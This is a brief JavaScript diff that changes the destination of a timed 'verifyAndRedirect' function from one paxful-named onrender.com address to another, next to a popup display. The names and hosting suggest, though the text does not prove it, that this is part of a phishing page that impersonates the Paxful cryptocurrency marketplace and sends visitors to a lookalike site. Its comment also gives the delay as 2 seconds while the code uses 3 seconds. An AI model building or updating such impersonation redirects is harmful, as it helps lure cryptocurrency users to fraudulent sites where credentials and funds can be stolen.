@@ -5,7 +5,7 @@ function verifyAndRedirect() {
     
     // Redirect after 2 seconds (2000 milliseconds)
     setTimeout(function() {
-        window.location.replace('https://paxful-kof2.onrender.com/');
+        window.location.replace('https://paxful-afbg.onrender.com/');
     }, 3000);
 
     popup.style.display = "block";
